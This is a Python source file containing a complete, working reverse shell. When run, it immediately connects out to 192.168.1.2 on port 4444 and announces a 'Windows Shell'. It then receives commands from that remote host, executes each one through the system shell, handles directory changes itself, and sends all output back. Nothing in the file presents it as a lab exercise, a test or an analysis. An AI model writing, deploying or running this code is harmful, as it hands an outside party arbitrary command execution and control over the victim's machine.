import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.2', 4444))
    
    s.send(b"Windows Shell - Fixed Version!\n")
    
    while True:
        try:
            # Show current directory in prompt
            prompt = f"\n[{os.getcwd()}]> "
            s.send(prompt.encode())
            
            command = s.recv(4096).decode().strip()
            
            if command.lower() in ['exit', 'quit']:
                s.send(b"Goodbye!\n")
                break
            if command == "":
                continue
                
            # Special handling for cd command
            if command.startswith('cd '):
                try:
                    new_dir = command[3:].strip()
                    os.chdir(new_dir)
                    s.send(f"Changed to {os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"cd error: {str(e)}\n".encode())
            else:
                # Execute other commands
                try:
                    process = subprocess.Popen(command, shell=True, 
                                             stdout=subprocess.PIPE, 
                                             stderr=subprocess.PIPE,
                                             stdin=subprocess.PIPE)
                    stdout, stderr = process.communicate(timeout=30)
                    
                    if stdout:
                        s.send(stdout)
                    if stderr:
                        s.send(stderr)
                    if not stdout and not stderr:
                        s.send(b"Command executed\n")
                        
                except subprocess.TimeoutExpired:
                    s.send(b"Command timed out\n")
                except Exception as e:
                    s.send(f"Execution error: {str(e)}\n".encode())
                    
        except Exception as e:
            s.send(f"Error: {str(e)}\n".encode())
            break
    
    s.close()

reverse_shell()